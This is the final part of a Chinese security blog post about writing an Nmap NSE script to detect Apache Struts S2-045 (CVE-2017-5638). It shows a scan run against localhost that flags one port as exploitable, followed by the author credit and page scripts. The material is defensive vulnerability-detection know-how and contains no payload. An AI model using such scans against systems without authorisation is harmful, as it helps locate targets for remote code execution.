+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>liyingzhe : <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>share<span style=color:#f92672>/</span>nmap <span style=color:#f92672>$</span>nmap <span style=color:#f92672>--</span>script <span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>liyingzhe<span style=color:#f92672>/</span>PycharmProjects<span style=color:#f92672>/</span>untitled<span style=color:#f92672>/</span>struts<span style=color:#f92672>.</span>nse <span style=color:#ae81ff>127.0</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Starting Nmap <span style=color:#ae81ff>7.01</span> ( https:<span style=color:#f92672>//</span>nmap<span style=color:#f92672>.</span>org ) at <span style=color:#ae81ff>2017</span><span style=color:#f92672>-</span><span style=color:#ae81ff>06</span><span style=color:#f92672>-</span><span style=color:#ae81ff>03</span> <span style=color:#ae81ff>03</span>:<span style=color:#ae81ff>09</span> CST
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> localhost (<span style=color:#ae81ff>127.0</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.1</span>)
+</span></span><span style=display:flex><span>Host is up (<span style=color:#ae81ff>0.000051</span>s latency)<span style=color:#f92672>.</span>
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>995</span> closed ports
+</span></span><span style=display:flex><span>PORT     STATE SERVICE
+</span></span><span style=display:flex><span><span style=color:#ae81ff>80</span><span style=color:#f92672>/</span>tcp   open  http
+</span></span><span style=display:flex><span><span style=color:#ae81ff>631</span><span style=color:#f92672>/</span>tcp  open  ipp
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1080</span><span style=color:#f92672>/</span>tcp open  socks
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_struts: ERROR: <span style=color:#a6e22e>Script</span> execution failed (use <span style=color:#f92672>-</span>d to debug)
+</span></span><span style=display:flex><span><span style=color:#ae81ff>3306</span><span style=color:#f92672>/</span>tcp open  mysql
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_struts: ERROR: <span style=color:#a6e22e>Script</span> execution failed (use <span style=color:#f92672>-</span>d to debug)
+</span></span><span style=display:flex><span><span style=color:#ae81ff>8899</span><span style=color:#f92672>/</span>tcp open  ospf<span style=color:#f92672>-</span>lite
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span> struts: 
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   VULNERABLE:
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Struts S2<span style=color:#f92672>-</span><span style=color:#ae81ff>045</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>     State: VULNERABLE (Exploitable)
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>     IDs:  CVE:CVE<span style=color:#f92672>-</span><span style=color:#ae81ff>2017</span><span style=color:#f92672>-</span><span style=color:#ae81ff>5638</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>       The Jakarta Multipart parser <span style=color:#f92672>in</span> Apache Struts <span style=color:#ae81ff>2</span> <span style=color:#ae81ff>2.3</span><span style=color:#f92672>.</span>x before <span style=color:#ae81ff>2.3</span><span style=color:#f92672>.</span><span style=color:#ae81ff>32</span> <span style=color:#f92672>and</span> <span style=color:#ae81ff>2.5</span><span style=color:#f92672>.</span>x before <span style=color:#ae81ff>2.5</span><span style=color:#f92672>.</span><span style=color:#ae81ff>10.1</span> mishandles file upload, which allows remote attackers to execute arbitrary commands via a <span style=color:#75715e>#cmd= string in a crafted Content-Type HTTP header, as exploited in the wild in March 2017.</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>     Disclosure date: <span style=color:#ae81ff>2017</span><span style=color:#f92672>-</span><span style=color:#ae81ff>03</span><span style=color:#f92672>-</span><span style=color:#ae81ff>07</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>     References:
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>       https:<span style=color:#f92672>//</span>cve<span style=color:#f92672>.</span>mitre<span style=color:#f92672>.</span>org<span style=color:#f92672>/</span>cgi<span style=color:#f92672>-</span>bin<span style=color:#f92672>/</span>cvename<span style=color:#f92672>.</span>cgi<span style=color:#960050;background-color:#1e0010>?</span>name<span style=color:#f92672>=</span>CVE<span style=color:#f92672>-</span><span style=color:#ae81ff>2017</span><span style=color:#f92672>-</span><span style=color:#ae81ff>5638</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>       http:<span style=color:#f92672>//</span>www<span style=color:#f92672>.</span>cnvd<span style=color:#f92672>.</span>org<span style=color:#f92672>.</span>cn<span style=color:#f92672>/</span>flaw<span style=color:#f92672>/</span>show<span style=color:#f92672>/</span>CNVD<span style=color:#f92672>-</span><span style=color:#ae81ff>2017</span><span style=color:#f92672>-</span><span style=color:#ae81ff>02474</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_      http:<span style=color:#f92672>//</span>cve<span style=color:#f92672>.</span>mitre<span style=color:#f92672>.</span>org<span style=color:#f92672>/</span>cgi<span style=color:#f92672>-</span>bin<span style=color:#f92672>/</span>cvename<span style=color:#f92672>.</span>cgi<span style=color:#960050;background-color:#1e0010>?</span>name<span style=color:#f92672>=</span>CVE<span style=color:#f92672>-</span><span style=color:#ae81ff>2017</span><span style=color:#f92672>-</span><span style=color:#ae81ff>5638</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Nmap done: <span style=color:#ae81ff>1</span> <span style=color:#a6e22e>IP</span> address (<span style=color:#ae81ff>1</span> host up) scanned <span style=color:#f92672>in</span> <span style=color:#ae81ff>7.20</span> seconds
+</span></span><span style=display:flex><span>liyingzhe : <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>share<span style=color:#f92672>/</span>nmap <span style=color:#f92672>$</span>
+</span></span></code></pre></td></tr></table></div></div><p>PS：本文为一叶知安首发，作者：倾旋。未经授权请勿转载。</p><p>如果你想了解更多或者想加入我们的读者群，可以加我的微信：<code>Guest_Killer_0nlis</code>。</p></div><nav class="hide-on-mobile section-nav"><nav id=TableOfContents><ol><li><a href=#0x00-nmap脚本简介>0x00 Nmap脚本简介</a></li><li><a href=#0x01-实战编写前的思路>0x01 实战编写前的思路</a></li><li><a href=#0x02-第一个函数-前奏>0x02 第一个函数-前奏</a></li><li><a href=#0x03-第二个函数-高潮>0x03 第二个函数-高潮</a></li><li><a href=#0x04-总结>0x04 总结</a></li></ol></nav></nav></div><div class=post><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post></div></div><div class="footer wrapper"><nav class=nav><div>2017 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script><script>var enableTruncate=!0,filterDepth=!1;const MAX_DEPTH=9;window.addEventListener("DOMContentLoaded",()=>{const e=new IntersectionObserver(e=>{e.reverse().forEach(e=>{const n=e.target.getAttribute("id");if(e.intersectionRatio>0){var t=document.querySelectorAll(`nav li a[href="#${n}"]`);t!=null&&t.forEach(e=>{if(e!=null){var t=getDepth(e.parentElement);filterDepth&&t<=MAX_DEPTH&&(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))}else filterDepth||(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))})}})});document.querySelectorAll("h1[id],h2[id],h3[id],h4[id]").forEach(t=>{e.observe(t)})});function isVisible(e){if(!(e instanceof Element))return!1;const n=getComputedStyle(e);if(n.display==="none")return!1;if(n.visibility!=="visible")return!1;if(n.opacity<.1)return!1;if(e.offsetWidth+e.offsetHeight+e.getBoundingClientRect().height+e.getBoundingClientRect().width===0)return!1;const t={x:e.getBoundingClientRect().left+e.offsetWidth/2,y:e.getBoundingClientRect().top+e.offsetHeight/2};if(t.x<0)return!1;if(t.x>(document.documentElement.clientWidth||window.innerWidth))return!1;if(t.y<0)return!1;if(t.y>(document.documentElement.clientHeight||window.innerHeight))return!1;let s=document.elementFromPoint(t.x,t.y);do if(s===e)return!0;while(s=s.parentNode)return!1}function clearActiveStatesInTableOfContents(){document.querySelectorAll("nav li").forEach(e=>{e.classList.remove("active")})}function getDepth(e){for(var t=0;e!==null&&e.tagName.toLowerCase()!=="ul";)t++,e=e.parentElement;return t}function navItems(){var e=document.querySelectorAll("nav nav li a");return Array.from(e).filter(e=>e.href!=null&&e.hash.startsWith("#"))}function lasItemInNavBarVisible(){var e=navItems().slice(-1)[0];return isVisible(e)}document.addEventListener("DOMContentLoaded",function(){if(!enableTruncate)return;var e=navItems();console.log(e),lasItemInNavBarVisible()||(filterDepth=!0,e.forEach(function(e){var t=getDepth(e.parentElement);t>MAX_DEPTH&&e.parentElement.classList.add("depth-nested")}))})</script></body></html>
